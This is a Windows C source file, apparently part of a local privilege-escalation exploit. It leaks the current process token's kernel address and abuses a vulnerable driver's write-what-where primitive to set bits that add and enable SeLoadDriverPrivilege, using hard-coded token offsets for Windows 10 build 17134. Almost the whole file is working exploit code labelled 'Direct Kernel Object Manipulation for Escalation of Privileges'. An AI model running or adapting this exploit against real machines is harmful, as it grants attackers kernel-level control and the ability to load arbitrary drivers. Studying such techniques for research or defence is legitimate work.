#include <windows.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdlib.h>

/// <summary>
/// define token offset that we want to manipulate
/// </summary>

//win10rs4.17134
/*
kd> dt nt!_TOKEN Privileges.
+ 0x040 Privileges  :
	+ 0x000 Present : Uint8B
	+ 0x008 Enabled : Uint8B
	+ 0x010 EnabledByDefault : Uint8B
*/
#define TOKEN_PRIVILEGES_PRESENT_OFFSET 0x40
#define TOKEN_PRIVILEGES_ENABLED_OFFSET 0x48
#define TOKEN_PRIVILEGES_ENABLEDBYDEFAULT_OFFSET 0x50

/// <summary>
/// define Se Privileges offset that we want to manipulate
/// </summary>

//win10rs4.17134
/*
Privs:
		 02 0x000000002 SeCreateTokenPrivilege            Attributes -
		 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes -
		 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default
		 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes -
		 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default
		 08 0x000000008 SeSecurityPrivilege               Attributes -
		 09 0x000000009 SeTakeOwnershipPrivilege          Attributes -
		 10 0x00000000a SeLoadDriverPrivilege             Attributes -
		 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default
		 12 0x00000000c SeSystemtimePrivilege             Attributes -
		 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default
		 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default
		 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default
		 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default
		 17 0x000000011 SeBackupPrivilege                 Attributes -
		 18 0x000000012 SeRestorePrivilege                Attributes -
		 19 0x000000013 SeShutdownPrivilege               Attributes -
		 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default
		 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default
		 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes -
		 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default
		 25 0x000000019 SeUndockPrivilege                 Attributes -
		 28 0x00000001c SeManageVolumePrivilege           Attributes -
		 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default
		 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default
		 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes -
		 32 0x000000020 SeRelabelPrivilege                Attributes -
		 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default
		 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default
		 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default
		 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default
*/

#define LOAD_DRIVER_PRIVILEGE_BYTE_OFFSET 0x01 //byte offset of SE_LOAD_DRIVER_PRIVILEGE (0xa)
#define LOAD_DRIVER_PRIVILEGE_BYTE_VALUE 0x04 //byte value to enable SE_LOAD_DRIVER_PRIVILEGE

PVOID
GetHandleObjectAddressFromHandle(
	HANDLE hPid,
	HANDLE hHandle);

EXTERN_C
HANDLE
OpenDevice();

EXTERN_C
BOOL
WriteWhatWhere(
	HANDLE hDevice, 
	PVOID pAddress, 
	PUCHAR pData, 
	DWORD dwSize);


/// <summary>
/// Direct Kernel Object Manipulation for Escalation of Privileges
/// adding SeLoadDriverPrivilege and enable it for current process
/// </summary>
/// <returns>BOOL</returns>

BOOL 
DoDKOMForEOP()
{

	BOOL bResult = FALSE;
	
	//open our own process token
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		printf("[-] OpenProcessToken() failed: %08x\n", GetLastError());
		goto Exit;
	}


	//get the token kernel address (where)
	PUCHAR pTokenAddress = NULL;
	if ((pTokenAddress = (PUCHAR)GetHandleObjectAddressFromHandle((HANDLE)GetCurrentProcessId(), hToken)) == NULL)
	{
		printf("[-] GetHandleObjectAddressFromHandle() failed\n");
		goto Exit;
	}

	printf("[+] TokenAdress=%p\n", pTokenAddress);

	//use DeviceIoControl to vulnerble driver to do write-what-where
	HANDLE hDevice;	
	if ((hDevice = OpenDevice()) == INVALID_HANDLE_VALUE)
	{
		printf("[-] OpenDevice() failed\n");
		goto Exit;
	}

	//Add SeLoadDriverPrivilege to the current process token
	UCHAR data[] = { LOAD_DRIVER_PRIVILEGE_BYTE_VALUE };

	printf("[m] Write-What-Where Privileges.Present @ %p\n",
		(pTokenAddress + TOKEN_PRIVILEGES_PRESENT_OFFSET + LOAD_DRIVER_PRIVILEGE_BYTE_OFFSET));

	if (!WriteWhatWhere(
			hDevice,
			(PVOID)(pTokenAddress + TOKEN_PRIVILEGES_PRESENT_OFFSET + LOAD_DRIVER_PRIVILEGE_BYTE_OFFSET),
			data,
			sizeof(data)))
	{
		printf("[-] WriteWhatWhere(Privileges.Present) failed\n");
		goto Exit;
	}


	//enable SeLoadDriverPrivilege for the current process token
	printf("[m] Write-What-Where Privileges.Enabled @ %p\n",
		pTokenAddress + TOKEN_PRIVILEGES_ENABLED_OFFSET + LOAD_DRIVER_PRIVILEGE_BYTE_OFFSET);

	if (!WriteWhatWhere(
		hDevice,
		(PVOID)(pTokenAddress + TOKEN_PRIVILEGES_ENABLED_OFFSET + LOAD_DRIVER_PRIVILEGE_BYTE_OFFSET),
		data,
		sizeof(data)))
	{
		printf("[-] WriteWhatWhere(Privileges.Enabled) failed\n");
		goto Exit;
	}

	return TRUE;

Exit:
	if (hToken)
	{
		CloseHandle(hToken);
	}

	if (pTokenAddress)
	{
		pTokenAddress = NULL;
	}

	if (hDevice)
	{
		CloseHandle(hDevice);
	}

	return bResult;
}//DoDKOMForEOP()



